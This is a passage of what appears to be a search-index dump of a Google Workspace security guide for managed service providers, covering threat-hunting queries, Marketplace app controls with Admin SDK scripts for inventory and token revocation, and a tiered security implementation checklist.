DAY)\n  )\nORDER BY timestamp;\n</code></pre></p>"},{"location":"log-analysis/#4-oauth-application-abuse-hunt","title":"4. OAuth Application Abuse Hunt","text":"<p>Objective: Identify potentially malicious third-party applications</p> <p>Log Sources: - Token Audit Log - Admin Audit Log</p> <p>Hunt Techniques:</p> <ol> <li>Suspicious Application Detection</li> <li>Identify new applications with sensitive scope requests</li> <li>Detect applications with unusual user adoption patterns</li> <li>Monitor for applications accessing unusual combinations of services</li> <li> <p>Track applications with abnormal token usage patterns</p> </li> <li> <p>Permission Scope Analysis</p> </li> <li>Identify overprivileged application authorizations</li> <li>Detect scope escalation in existing applications</li> <li>Monitor for sensitive scope approvals (Gmail, Drive, Admin)</li> <li>Track unusual scope usage patterns</li> </ol> <p>Sample Hunt Query (SQL-like): <pre><code>SELECT application_name, client_id, requested_scopes, \n       COUNT(DISTINCT user_email) as user_count\nFROM token_audit_logs\nWHERE event_type = 'AUTHORIZE'\n  AND timestamp &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 14 DAY)\n  AND (\n    requested_scopes LIKE '%gmail.modify%' OR\n    requested_scopes LIKE '%drive%' OR\n    requested_scopes LIKE '%admin%'\n  )\n  AND client_id NOT IN (SELECT client_id FROM approved_applications)\nGROUP BY application_name, client_id, requested_scopes\nORDER BY user_count DESC;\n</code></pre></p>"},{"location":"log-analysis/#5-persistence-mechanism-hunt","title":"5. Persistence Mechanism Hunt","text":"<p>Objective: Identify attacker persistence techniques</p> <p>Log Sources: - Admin Audit Log - Gmail Log - Rules Log - Groups Audit Log</p> <p>Hunt Techniques:</p> <ol> <li>Account Manipulation Detection</li> <li>Identify changes to account recovery options</li> <li>Detect modifications to user authentication settings</li> <li>Monitor for password changes after suspicious events</li> <li> <p>Track MFA disablement or changes</p> </li> <li> <p>Rule-Based Persistence Identification</p> </li> <li>Identify creation of suspicious email forwarding rules</li> <li>Detect unusual filter creations in Gmail</li> <li>Monitor for scheduled jobs or triggers in Google environment</li> <li>Track automated script deployment or modification</li> </ol> <p>Sample Hunt Query (SQL-like): <pre><code>SELECT user_email, rule_id, rule_criteria, forward_destination, creation_time\nFROM mail_rules_logs\nWHERE event_type = 'CREATE_RULE'\n  AND rule_action = 'FORWARD'\n  AND creation_time &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY)\n  AND forward_destination NOT LIKE '%@company.com'\n  AND forward_destination NOT IN (SELECT email FROM approved_forwarding_destinations)\nORDER BY creation_time DESC;\n</code></pre></p>"},{"location":"log-analysis/#advanced-threat-hunting-techniques","title":"Advanced Threat Hunting Techniques","text":""},{"location":"log-analysis/#user-behavior-analytics-uba","title":"User Behavior Analytics (UBA)","text":"<p>Implement advanced behavioral analytics:</p> <ol> <li>User Risk Scoring</li> <li>Develop multi-factor risk scoring based on log patterns</li> <li>Weight different anomalies based on security impact</li> <li>Adjust baselines based on role, department, and activity history</li> <li> <p>Combine multiple low-risk indicators to identify high-risk patterns</p> </li> <li> <p>Peer Group Analysis</p> </li> <li>Group users by role, department, and function</li> <li>Establish behavioral norms within each peer group</li> <li>Compare individual activity against peer group</li> <li> <p>Identify significant deviations from peer behavior</p> </li> <li> <p>Session Analysis</p> </li> <li>Track full user sessions rather than isolated events</li> <li>Analyze activity sequences within sessions</li> <li>Identify unusual transitions between services</li> <li>Detect abnormal session duration or activity volume</li> </ol>"},{"location":"log-analysis/#threat-intelligence-integration","title":"Threat Intelligence Integration","text":"<p>Enhance log analysis with threat intelligence:</p> <ol> <li>Indicator Matching</li> <li>Compare observed IP addresses against known threat infrastructure</li> <li>Match user agents against known malicious patterns</li> <li>Identify access from high-risk geographies</li> <li> <p>Detect connections to known command and control domains</p> </li> <li> <p>TTP Pattern Matching</p> </li> <li>Create detection rules based on known attacker techniques</li> <li>Match event sequences against documented attack patterns</li> <li>Develop specific detections for Google Workspace attack techniques</li> <li> <p>Adjust detections based on emerging threat intelligence</p> </li> <li> <p>Custom Threat Feeds</p> </li> <li>Develop Google Workspace-specific IoC feeds</li> <li>Share intelligence across multiple tenant environments</li> <li>Create MSP-specific intelligence based on cross-client observations</li> <li>Develop vertical-specific threat indicators</li> </ol>"},{"location":"log-analysis/#msp-specific-considerations","title":"MSP-Specific Considerations","text":""},{"location":"log-analysis/#multi-tenant-monitoring-strategies","title":"Multi-Tenant Monitoring Strategies","text":"<ol> <li>Cross-Tenant Analysis</li> <li>Implement normalized logging across all clients</li> <li>Develop cross-tenant correlation capabilities</li> <li>Create consistent detection rules applicable to all environments</li> <li> <p>Enable comparative analysis between similar organizations</p> </li> <li> <p>Tenant Isolation</p> </li> <li>Maintain strict data segregation between tenants</li> <li>Implement tenant-specific access controls for logs</li> <li>Create role-based access to log analysis capabilities</li> <li> <p>Ensure client confidentiality in multi-tenant SOC</p> </li> <li> <p>Scalable Detection Engineering</p> </li> <li>Develop reusable detection content</li> <li>Implement programmatic rule deployment across tenants</li> <li>Create tenant-specific tuning capabilities</li> <li>Balance standardization with client-specific requirements</li> </ol>"},{"location":"log-analysis/#client-reporting-and-dashboards","title":"Client Reporting and Dashboards","text":"<ol> <li>Executive-Level Reporting</li> <li>Create high-level security posture dashboards</li> <li>Develop trend analysis for key security metrics</li> <li>Implement comparative benchmarking against industry peers</li> <li> <p>Provide actionable security improvement recommendations</p> </li> <li> <p>Technical Reporting</p> </li> <li>Create detailed logs of security events</li> <li>Provide technical indicators for client security teams</li> <li>Implement drill-down capabilities for investigations</li> <li> <p>Offer raw log access for client-directed analysis</p> </li> <li> <p>Compliance-Focused Reporting</p> </li> <li>Map log analysis to compliance frameworks</li> <li>Create audit-ready reports for regulatory requirements</li> <li>Provide evidence of security control effectiveness</li> <li>Document security incidents and resolution actions</li> </ol>"},{"location":"log-analysis/#implementation-roadmap","title":"Implementation Roadmap","text":""},{"location":"log-analysis/#phase-1-foundation","title":"Phase 1: Foundation","text":"<ul> <li>Implement comprehensive log collection from all critical sources</li> <li>Establish baseline visibility and basic alerting</li> <li>Develop initial detection use cases for high-risk scenarios</li> <li>Create basic reporting capabilities</li> </ul>"},{"location":"log-analysis/#phase-2-enhancement","title":"Phase 2: Enhancement","text":"<ul> <li>Implement advanced correlation between log sources</li> <li>Develop user and entity behavioral baselines</li> <li>Create threat hunting program and initial playbooks</li> <li>Enhance detection coverage for known attack techniques</li> </ul>"},{"location":"log-analysis/#phase-3-optimization","title":"Phase 3: Optimization","text":"<ul> <li>Implement machine learning for anomaly detection</li> <li>Develop automated response workflows</li> <li>Create advanced threat hunting capabilities</li> <li>Establish continuous improvement processes</li> </ul>"},{"location":"log-analysis/#useful-resources","title":"Useful Resources","text":"<ul> <li>Google Workspace Admin SDK</li> <li>Google Security Operations</li> <li>Chronicle Security Operations</li> <li>MITRE ATT&amp;CK Cloud Matrix</li> <li>Google Workspace Security Best Practices</li> </ul> <p>Note: This guide should be adapted to your organization's specific environment, requirements, and security maturity level.</p>"},{"location":"marketplace-security/","title":"Marketplace Security","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"marketplace-security/#google-workspace-marketplace-security","title":"Google Workspace Marketplace Security","text":"<p>This guide provides security professionals and MSPs with comprehensive strategies for securing Google Workspace Marketplace applications, focusing on the unique challenges of managing third-party application security in multi-tenant environments.</p>"},{"location":"marketplace-security/#understanding-the-marketplace-security-landscape","title":"Understanding the Marketplace Security Landscape","text":""},{"location":"marketplace-security/#marketplace-application-architecture","title":"Marketplace Application Architecture","text":"<p>Google Workspace Marketplace applications can integrate with Google services in multiple ways, each with distinct security implications:</p> <ol> <li>OAuth-Based Integration</li> <li>Applications request specific OAuth scopes</li> <li>Access persists through user-approved tokens</li> <li> <p>Can operate with user's permissions across Google services</p> </li> <li> <p>Add-on Integrations</p> </li> <li>Context-specific extensions for Gmail, Drive, etc.</li> <li>Run within specific Google applications</li> <li> <p>May have deep integration with content and data</p> </li> <li> <p>Chrome Extensions</p> </li> <li>Browser-based functionality</li> <li>Can interact with Google Workspace in the browser context</li> <li> <p>May have persistent access to user sessions</p> </li> <li> <p>Apps Script Integrations</p> </li> <li>Custom code running in Google's infrastructure</li> <li>Deep integration with Google services</li> <li>Can create automations and workflows</li> </ol>"},{"location":"marketplace-security/#critical-security-considerations","title":"Critical Security Considerations","text":"<p>When managing Marketplace applications, several critical security factors must be addressed:</p> <ol> <li>Existing Installation Challenge</li> <li>Key issue: Allowlisting doesn't remove previously installed applications</li> <li>Applications installed before restrictions may retain access</li> <li> <p>User-level installations may exist across organizational units</p> </li> <li> <p>Organizational Unit Limitations</p> </li> <li>Applications can be enabled/disabled at OU level</li> <li>User movement between OUs impacts application access</li> <li> <p>Some administrative applications bypass OU controls</p> </li> <li> <p>Permission Persistence</p> </li> <li>OAuth tokens may persist despite policy changes</li> <li>Application access can survive user password changes</li> <li> <p>Revoking access requires explicit token revocation</p> </li> <li> <p>Installation Scope Variations</p> </li> <li>Some apps can only be installed by administrators</li> <li>Others allow user-initiated installation</li> <li>Admin-installed apps may have different permission models</li> </ol>"},{"location":"marketplace-security/#comprehensive-marketplace-security-strategy","title":"Comprehensive Marketplace Security Strategy","text":""},{"location":"marketplace-security/#1-application-inventory-and-audit","title":"1. Application Inventory and Audit","text":"<p>First, establish complete visibility into your current Marketplace application landscape:</p> <p>Inventory Current Installations: <pre><code># Python script example using Google Admin SDK\nfrom googleapiclient.discovery import build\nfrom oauth2client.service_account import ServiceAccountCredentials\n\ndef get_installed_applications(admin_sdk_service):\n    \"\"\"Retrieve all installed Marketplace applications across the organization\"\"\"\n    # Get all Chrome apps and extensions\n    chrome_apps = admin_sdk_service.chromeosdevices().list(customerId='my_customer').execute()\n    \n    # Get OAuth application grants\n    tokens = admin_sdk_service.tokens().list(customerId='my_customer').execute()\n    \n    # Get Apps Script projects\n    # Note: Requires Apps Script API enablement\n    # [Implementation details]\n    \n    return {\n        'chrome_apps': chrome_apps,\n        'oauth_tokens': tokens,\n        'apps_scripts': apps_scripts\n    }\n\n# Authentication setup\ncredentials = ServiceAccountCredentials.from_json_keyfile_name(\n    'service-account.json',\n    ['https://www.googleapis.com/auth/admin.directory.device.chromeos',\n     'https://www.googleapis.com/auth/admin.directory.user']\n)\ncredentials = credentials.create_delegated('admin@domain.com')\nservice = build('admin', 'directory_v1', credentials=credentials)\n\n# Get inventory\napp_inventory = get_installed_applications(service)\n</code></pre></p> <p>Audit Techniques: 1. Compare installed applications against current allowlist 2. Identify previously installed applications that would now be restricted 3. Document application permissions and access scopes 4. Map user-to-application relationships</p>"},{"location":"marketplace-security/#2-comprehensive-cleanup-process","title":"2. Comprehensive Cleanup Process","text":"<p>Address existing installations that don't meet current security requirements:</p> <p>Admin-Level Cleanup: <pre><code>Admin Console &gt; Apps &gt; Marketplace Apps &gt; App Management\n- Filter for \"User-installed apps\"\n- Select non-compliant applications\n- Click \"Revoke\" to remove access organization-wide\n</code></pre></p> <p>Important: This will revoke OAuth access tokens for selected applications across all users, but requires careful planning to avoid disruption.</p> <p>Scripted Token Revocation: <pre><code># Python script to revoke specific application tokens\ndef revoke_application_tokens(admin_sdk_service, client_id):\n    \"\"\"Revoke all tokens for a specific application client ID\"\"\"\n    users = admin_sdk_service.users().list(customer='my_customer').execute()\n    \n    for user in users.get('users', []):\n        user_email = user['primaryEmail']\n        try:\n            # List tokens for user\n            tokens = admin_sdk_service.tokens().list(userKey=user_email).execute()\n            \n            # Find and revoke tokens for target application\n            for token in tokens.get('items', []):\n                if token.get('clientId') == client_id:\n                    admin_sdk_service.tokens().delete(\n                        userKey=user_email,\n                        clientId=client_id\n                    ).execute()\n                    print(f\"Revoked token for {user_email}\")\n        except Exception as e:\n            print(f\"Error processing {user_email}: {str(e)}\")\n</code></pre></p> <p>Chrome Extension Cleanup: <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Apps &amp; Extensions\n- Locate non-compliant extensions\n- Block installation and force removal\n</code></pre></p> <p>Apps Script Project Audit: <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Apps Script\n- Review and configure Apps Script project settings\n- Disable unauthorized Apps Script execution\n</code></pre></p>"},{"location":"marketplace-security/#3-implementing-proper-application-controls","title":"3. Implementing Proper Application Controls","text":"<p>Configure comprehensive controls for Marketplace applications:</p> <p>OAuth Application Allowlisting: <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Domain-wide OAuth API Access Control\n- Set to \"Only allow user access to specific third-party applications\"\n- Configure \"Google Workspace Marketplace Apps control\"\n</code></pre></p> <p>Important Considerations: 1. Allowlisting is forward-looking and doesn't affect existing installations 2. Test impact on critical applications before enforcement 3. Document exceptions and justifications</p> <p>Application Installation Policy: <pre><code>Admin Console &gt; Apps &gt; Marketplace Apps &gt; Settings\n- Choose appropriate installation restrictions:\n  - \"Only allow installation of selected applications\"\n  - \"Block installation of specific applications\"\n- Apply settings to appropriate OUs\n</code></pre></p> <p>Chrome Application Management: <pre><code>Admin Console &gt; Devices &gt; Chrome &gt; Apps &amp; Extensions\n- Configure force-installed applications\n- Block unauthorized extensions\n- Set installation permissions by OU\n</code></pre></p>"},{"location":"marketplace-security/#4-organizational-unit-application-strategy","title":"4. Organizational Unit Application Strategy","text":"<p>Develop a structured approach for application management across OUs:</p> <p>OU-Based Application Profiles: 1. Define application requirements by user function 2. Create OU structure that supports differentiated application access 3. Document required applications for each functional group</p> <p>OU Transition Procedures: 1. Develop process for handling application access during OU moves 2. Create verification procedures for access changes 3. Implement monitoring for unexpected application behaviors after moves</p> <p>Handling Administrator-Only Applications: 1. Identify applications that can only be installed by administrators 2. Create approval workflow for admin-level application requests 3. Implement enhanced monitoring for privileged applications</p>"},{"location":"marketplace-security/#advanced-marketplace-security-techniques","title":"Advanced Marketplace Security Techniques","text":""},{"location":"marketplace-security/#continuous-application-monitoring","title":"Continuous Application Monitoring","text":"<p>Implement ongoing monitoring to detect application security risks:</p> <p>OAuth Token Activity Monitoring: <pre><code>-- Example monitoring query for suspicious application activity\nSELECT user_email, application_name, client_id, scope_list, \n       request_time, ip_address, user_agent\nFROM token_audit_logs\nWHERE application_name NOT IN (SELECT app_name FROM approved_applications)\n  AND (\n    scope_list LIKE '%gmail%' OR\n    scope_list LIKE '%drive%' OR\n    scope_list LIKE '%admin%'\n  )\nORDER BY request_time DESC\n</code></pre></p> <p>Application Behavior Analysis: 1. Establish baseline application activity patterns 2. Monitor for anomalous API call volumes or patterns 3. Track application resource access changes 4. Implement alerts for suspicious authorization requests</p> <p>Marketplace Application Security Scoring: 1. Develop risk scoring methodology for applications 2. Consider factors like:    - Developer reputation    - Requested permissions    - User base size    - Update frequency    - Privacy policy quality 3. Use scoring to inform allowlisting decisions</p>"},{"location":"marketplace-security/#application-lifecycle-management","title":"Application Lifecycle Management","text":"<p>Implement comprehensive governance for application lifecycle:</p> <p>Application Acquisition Process: 1. Create standardized request process for new applications 2. Implement security review requirements 3. Document business justification and data access needs 4. Conduct privacy review for user data implications</p> <p>Periodic Application Review: 1. Schedule quarterly review of approved applications 2. Assess ongoing business need and usage patterns 3. Review permission scopes for potential reduction 4. Validate security posture of critical applications</p> <p>Application Decommissioning Procedure: 1. Identify unused or deprecated applications 2. Develop communication plan for affected users 3. Create phased removal process to minimize disruption 4. Implement token revocation and access removal 5. Verify complete access termination</p>"},{"location":"marketplace-security/#security-control-testing","title":"Security Control Testing","text":"<p>Validate the effectiveness of Marketplace security controls:</p> <p>Allowlist Bypass Testing: 1. Attempt to install restricted applications in test environment 2. Verify that restrictions apply across acquisition methods 3. Test OU transition scenarios for control persistence 4. Validate admin notification for blocked installation attempts</p> <p>Permission Escalation Testing: 1. Evaluate approved applications for permission escalation risks 2. Test application behavior when requesting additional scopes 3. Verify notification process for permission changes 4. Validate revocation effectiveness</p> <p>OAuth Token Persistence Testing: 1. Monitor token persistence after various account actions 2. Verify revocation effectiveness across device types 3. Test token behavior across organizational changes 4. Validate cleanup procedures for terminated users</p>"},{"location":"marketplace-security/#msp-specific-marketplace-security","title":"MSP-Specific Marketplace Security","text":""},{"location":"marketplace-security/#multi-tenant-application-management","title":"Multi-Tenant Application Management","text":"<p>For MSPs managing multiple client environments:</p> <p>Client-Specific Application Profiles: 1. Develop standard application bundles by client type 2. Create client-specific approval processes 3. Implement isolation between client application environments 4. Document cross-client application considerations</p> <p>Delegated Application Administration: 1. Configure appropriate delegated controls for client admins 2. Establish clear responsibilities for application management 3. Implement approval workflows for sensitive application changes 4. Create audit capabilities for delegated administration actions</p> <p>Multi-Tenant Monitoring: 1. Deploy cross-tenant application monitoring 2. Create client-specific application alerts 3. Develop comparative application metrics across clients 4. Implement threat intelligence sharing for application risks</p>"},{"location":"marketplace-security/#client-onboarding-application-security","title":"Client Onboarding Application Security","text":"<p>Establish structured application management during client onboarding:</p> <p>Application Discovery Phase: 1. Inventory existing applications before migration 2. Identify business-critical application dependencies 3. Document application integrations and workflows 4. Assess security risks in current application portfolio</p> <p>Application Migration Strategy: 1. Classify applications by migration priority 2. Develop testing plan for business-critical applications 3. Create contingency plans for incompatible applications 4. Establish timeline for application transition</p> <p>Post-Migration Verification: 1. Verify application functionality after migration 2. Validate security controls for migrated applications 3. Implement monitoring for application anomalies 4. Document exceptions and special handling requirements</p>"},{"location":"marketplace-security/#common-marketplace-security-challenges","title":"Common Marketplace Security Challenges","text":""},{"location":"marketplace-security/#challenge-1-shadow-it-applications","title":"Challenge 1: Shadow IT Applications","text":"<p>Issue: Users install unauthorized applications outside management visibility</p> <p>Detection Techniques: 1. Regular token audits across the organization 2. Browser extension inventory and monitoring 3. Data access pattern analysis 4. Network traffic monitoring for API calls</p> <p>Remediation Strategies: 1. Implement technical controls to prevent unauthorized installations 2. Create clear application request process for users 3. Provide pre-approved application catalog 4. Conduct user education on application security risks</p>"},{"location":"marketplace-security/#challenge-2-permission-creep","title":"Challenge 2: Permission Creep","text":"<p>Issue: Authorized applications request additional permissions over time</p> <p>Detection Techniques: 1. Track scope changes for authorized applications 2. Monitor authorization requests for scope expansion 3. Compare current permissions against initial approval 4. Audit API call patterns for permission usage</p> <p>Remediation Strategies: 1. Implement scope change approval processes 2. Create alerts for permission expansion requests 3. Conduct periodic permission rationalization 4. Maintain principle of least privilege in approvals</p>"},{"location":"marketplace-security/#challenge-3-application-developer-changes","title":"Challenge 3: Application Developer Changes","text":"<p>Issue: Marketplace applications change ownership or security posture</p> <p>Detection Techniques: 1. Monitor application developer information changes 2. Track application update patterns and changes 3. Review privacy policy and terms updates 4. Monitor community feedback and security reports</p> <p>Remediation Strategies: 1. Implement periodic application re-verification 2. Create quick response process for suspicious changes 3. Maintain application alternatives documentation 4. Develop emergency revocation procedures</p>"},{"location":"marketplace-security/#implementation-checklist","title":"Implementation Checklist","text":""},{"location":"marketplace-security/#marketplace-security-baseline","title":"Marketplace Security Baseline","text":"<ul> <li> Complete inventory of currently installed applications</li> <li> Document business justification for each application</li> <li> Implement application allowlisting policy</li> <li> Configure OU-based application controls</li> <li> Revoke access for unauthorized applications</li> <li> Implement monitoring for application activity</li> <li> Create application request and approval workflow</li> <li> Establish regular application review schedule</li> </ul>"},{"location":"marketplace-security/#ongoing-maintenance-tasks","title":"Ongoing Maintenance Tasks","text":"<ul> <li> Weekly review of new application requests</li> <li> Monthly audit of token authorizations</li> <li> Quarterly review of application inventory</li> <li> Semi-annual security assessment of critical applications</li> <li> Annual comprehensive application rationalization</li> </ul>"},{"location":"marketplace-security/#resources-and-documentation","title":"Resources and Documentation","text":"<ul> <li>Google Workspace Marketplace Settings</li> <li>Google API Access Control</li> <li>OAuth Application Verification</li> <li>Chrome Enterprise Extension Management</li> <li>Apps Script Security Best Practices</li> </ul>"},{"location":"marketplace-security/#appendix-application-security-assessment-template","title":"Appendix: Application Security Assessment Template","text":"<pre><code>MARKETPLACE APPLICATION SECURITY ASSESSMENT\n\nApplication Name:\nDeveloper:\nApplication Type: [ ] OAuth App [ ] Add-on [ ] Chrome Extension [ ] Apps Script\n\nREQUESTED PERMISSIONS\n- Gmail: [ ] Read [ ] Modify [ ] Full Access\n- Drive: [ ] Read [ ] Modify [ ] Full Access\n- Calendar: [ ] Read [ ] Modify [ ] Full Access\n- Admin: [ ] Read [ ] Modify [ ] Full Access\n- Other: _____________________________\n\nSECURITY EVALUATION\nDeveloper Reputation: [ ] Unknown [ ] Limited History [ ] Established [ ] Google Verified\nLast Updated: _______________\nUser Base Size: _______________\nSecurity Features: [ ] Encryption [ ] Data Minimization [ ] Limited Scopes [ ] Other: _______\n\nRISK ASSESSMENT\nData Access Risk: [ ] Low [ ] Medium [ ] High\nIntegration Risk: [ ] Low [ ] Medium [ ] High\nOrganizational Impact: [ ] Low [ ] Medium [ ] High\nOverall Risk Score: [ ] Low [ ] Medium [ ] High\n\nRECOMMENDATION\n[ ] Approve for Organization\n[ ] Approve with Restrictions: _____________________________\n[ ] Approve for Specific OUs: _____________________________\n[ ] Deny\n[ ] Additional Review Required: _____________________________\n\nAPPROVAL INFORMATION\nReviewed By: _______________\nDate: _______________\nExpiration/Review Date: _______________\n</code></pre> <p>Note: This guide should be adapted to your organization's specific Google Workspace configuration, security requirements, and operational needs.</p>"},{"location":"msp-implementation/","title":"MSP Implementation","text":"<p>Under Construction</p> <p>This page is under construction. Please check back later for comprehensive guidance</p>"},{"location":"msp-implementation/#google-workspace-security-implementation-guide-for-msps","title":"Google Workspace Security Implementation Guide for MSPs","text":"<p>This comprehensive checklist provides Managed Service Providers (MSPs) with a structured approach to implementing robust security controls across client Google Workspace environments. The guide is organized into implementation tiers to accommodate different client security requirements and budgets.</p>"},{"location":"msp-implementation/#implementation-framework","title":"Implementation Framework","text":"<p>This guide uses a tiered implementation approach:</p> <ul> <li>Tier 1: Essential Security - Critical controls all clients should implement regardless of size or industry</li> <li>Tier 2: Enhanced Security - Additional controls for clients with elevated security requirements</li> <li>Tier 3: Advanced Security - Comprehensive controls for clients with strict security or compliance needs</li> </ul>"},{"location":"msp-implementation/#client-onboarding-security-implementation","title":"Client Onboarding Security Implementation","text":""},{"location":"msp-implementation/#phase-1-initial-assessment-planning-week-1","title":"Phase 1: Initial Assessment &amp; Planning (Week 1)","text":"Task Description Tier Discovery Questionnaire Complete security requirements questionnaire with client stakeholders All Current State Assessment Evaluate existing Google Workspace configuration and security settings All Environment Documentation Document domains, user count, organizational structure All Security Tier Selection Determine appropriate security tier based on client needs All Implementation Plan Develop timeline and responsibility matrix for security implementation All Security SLAs Define security-related service level agreements All"},{"location":"msp-implementation/#phase-2-account-authentication-security-week-2","title":"Phase 2: Account &amp; Authentication Security (Week 2)","text":"Task Description Tier Password Policy Implementation Configure strong password requirements (12+ chars, complexity) All Basic MFA Enablement Enable 2-Step Verification for all users All MFA Enforcement Make 2-Step Verification mandatory for all users All Account Recovery Options Configure secure account recovery settings All Security Key Enforcement Require security keys for admin accounts T2, T3 Advanced Protection Program Enroll high-value users in APP T2, T3 Context-Aware Access Implement location and device-based access policies T3 Login Challenges Configure risk-based login challenges T2, T3 Password Leak Detection Enable password breach detection All SSO Implementation Configure SAML-based SSO for enterprise applications T2, T3 Session Control Policies Set appropriate session length and timeout policies All Session Device Monitoring Enable device monitoring for sessions T2, T3"},{"location":"msp-implementation/#phase-3-administrative-controls-week-2-3","title":"Phase 3: Administrative Controls (Week 2-3)","text":"Task Description Tier Admin Role Segmentation Implement separation of admin duties All Super Admin Protection Secure super admin accounts with enhanced controls All Service Account Inventory Document and secure all service accounts All Admin Audit Logging Enable comprehensive admin activity logging All Admin Account Dedicated Devices Implement dedicated devices for admin access T2, T3 Emergency Access Process Establish break-glass procedures for admin access T2, T3 Access Request Workflow Implement formal process for privilege requests T2, T3 Admin Activity Reviews Schedule regular reviews of administrative actions T2, T3 Privileged Access Management Implement time-bound elevated access T3 Admin IP Restriction Restrict admin console access to approved IPs T2, T3 MSP Access Controls Configure secure partner access for management All Access Certification Process Implement regular access reviews T2, T3"},{"location":"msp-implementation/#phase-4-email-security-week-3","title":"Phase 4: Email Security (Week 3)","text":"Task Description Tier Spam and Phishing Protection Configure enhanced Gmail protection settings All Attachment Defense Set appropriate attachment handling policies All SPF Configuration Implement SPF for all domains All DKIM Implementation Configure DKIM signing for all domains All DMARC Policy Implement appropriate DMARC policy All Email Content Compliance Configure content compliance rules T2, T3 External Recipient Warnings Enable warnings for external recipients All Suspicious Link Warnings Configure enhanced URL protection All Email Forwarding Controls Restrict automatic email forwarding All Email DLP Policies Implement DLP rules for sensitive content T2, T3 Advanced Phishing Protection Enable enhanced anti-phishing capabilities T2, T3 Email Retention Policies Configure appropriate retention settings All Email Gateway Integration Configure third-party email security (if applicable) T3"},{"location":"msp-implementation/#phase-5-drive-document-security-week-3-4","title":"Phase 5: Drive &amp; Document Security (Week 3-4)","text":"Task Description Tier File Sharing Restrictions Configure appropriate sharing permissions All External Sharing Controls Implement controls for external collaboration All Drive DLP Policies Configure DLP for document content T2, T3 Classification Labels Implement document classification system T2, T3 Shared Drive Governance Configure secure Shared Drive settings All Drive Audit Logging Enable comprehensive Drive activity logging All Access Control Monitoring Implement monitoring for permission changes T2, T3 Link Sharing Restrictions Configure link-based sharing controls All Sensitive Content Detection Implement content scanning for sensitive data T2, T3 File Access Monitoring Deploy monitoring for unusual file access T2, T3 Information Rights Management Configure document IRM capabilities T3 Drive Retention Policies Implement appropriate retention settings All"},{"location":"msp-implementation/#phase-6-application-security-week-4","title":"Phase 6: Application Security (Week 4)","text":"Task Description Tier Application Access Control Configure access to Google Workspace services All Third-Party App Review Process Establish app review and approval workflow All OAuth Application Restrictions Implement controls for third-party apps All API Access Management Configure secure API access controls All Apps Script Controls Implement secure Apps Script settings T2, T3 Marketplace App Restrictions Control user access to Google Workspace Marketplace All SAML App Inventory Document and secure all SAML integrations T2, T3 Unused Service Disablement Disable unnecessary Google services All Access Context Restrictions Define API access contexts T3 API Client Whitelisting Restrict API access to approved clients T2, T3 Application Security Reports Schedule regular app security reviews T2, T3 Add-on Security Review Assess security of browser and service add-ons T2, T3"},{"location":"msp-implementation/#phase-7-mobile-device-security-week-4-5","title":"Phase 7: Mobile Device Security (Week 4-5)","text":"Task Description Tier Mobile Device Management Implement basic MDM for company devices All Device Approval Process Configure device approval workflow All Mobile Security Policy Define and enforce mobile security requirements All Device Encryption Requirements Enforce device encryption All Screen Lock Enforcement Configure minimum screen lock requirements All Account Sync Controls Implement controls for account synchronization All Mobile Application Management Configure app management for mobile devices T2, T3 Container Implementation Deploy workspace containers for BYOD T2, T3 Device Monitoring Implement device security monitoring T2, T3 Device Policy Segmentation Create role-based device policies T2, T3 Automated Compliance Actions Configure automated actions for non-compliant devices T2, T3 Remote Wipe Capability Ensure remote wipe functionality is tested All"},{"location":"msp-implementation/#phase-8-monitoring-detection-week-5","title":"Phase 8: Monitoring &amp; Detection (Week 5)","text":"Task Description Tier Basic Alert Configuration Configure essential security alerts All Log Collection Implementation Set up comprehensive log collection All Login Monitoring Implement monitoring for suspicious logins All Rule Change Monitoring Alert on mail rule or forwarding changes All Admin Action Monitoring Alert on critical administrative changes All Data Exfiltration Monitoring Implement basic DLP alerts All SIEM Integration Configure integration with security monitoring tools T2, T3 Custom Alert Policies Develop client-specific monitoring rules T2, T3 User Behavior Analytics Implement UBA for anomaly detection T3 Automated Response Rules Configure automated incident response T3 Threat Hunting Program Establish routine threat hunting activities T3 Security Dashboard Implement custom security monitoring dashboard T2, T3"},{"location":"msp-implementation/#phase-9-incident-response-preparation-week-6","title":"Phase 9: Incident Response Preparation (Week 6)","text":"Task Description Tier Incident Response Plan Develop Google Workspace-specific IR plan All Account Recovery Process Document account recovery procedures All Compromise Response Playbooks Create playbooks for common incidents All Contact Matrix Establish notification and escalation contacts All Evidence Preservation Process Document evidence collection procedures All IR Role Assignments Define incident response team and responsibilities All Communication Templates Prepare incident communication templates All IR Tool Access Ensure responders have appropriate access All Tabletop Exercise Conduct incident response simulation T2, T3 Forensic Collection Capability Implement forensic data collection procedures T2, T3 Cross-Domain Response Develop procedures for multi-service incidents T2, T3 Third-Party IR Integration Establish relationships with external IR providers T3"},{"location":"msp-implementation/#phase-10-security-documentation-training-week-6","title":"Phase 10: Security Documentation &amp; Training (Week 6)","text":"Task Description Tier Security Configuration Documentation Document all security settings All Admin Training Train client administrators on security features All End User Security Guidelines Develop user-facing security documentation All Security Awareness Training Deliver basic security awareness training All Access Control Matrix Document role-based access controls All Data Handling Guidelines Develop information classification guide T2, T3 Service Level Documentation Document security-related SLAs All Implementation Attestation Provide formal security implementation documentation All Advanced Admin Training Deliver specialized security administration training T2, T3 Phishing Simulation Program Implement ongoing phishing exercises T2, T3 Security Knowledge Base Develop client-specific security knowledge base T2, T3 Executive Security Briefing Deliver executive summary of security implementation T2, T3"},{"location":"msp-implementation/#ongoing-management-optimization","title":"Ongoing Management &amp; Optimization","text":""},{"location":"msp-implementation/#routine-security-operations","title":"Routine Security Operations","text":"Frequency Task Description Tier Daily Security Alert Triage Review and respond to security alerts All Daily Critical Configuration Monitoring Check for unauthorized changes to critical settings All Weekly User Account Review Review recent user account changes All Weekly Privileged Activity Review Audit administrative actions All Weekly Security Policy Compliance Check Verify compliance with security policies All Bi-weekly Third-Party Application Review Review newly authorized applications All Monthly Access Review Conduct formal access review T2, T3 Monthly Security Control Validation Test key security controls T2, T3 Monthly Security Metrics Reporting Generate and review security metrics T2, T3 Quarterly Threat Hunting Conduct proactive threat hunting T2, T3 Quarterly Configuration Baseline Review Review and update security baselines All Quarterly Security Improvement Planning Identify and plan security enhancements All Annual Comprehensive Security Review Complete review of security implementation All Annual Incident Response Testing Test and update IR procedures T2, T3 Annual Security Roadmap Update Update multi-year security strategy All"},{"location":"msp-implementation/#security-optimization-cycles","title":"Security Optimization Cycles","text":"Cycle Focus 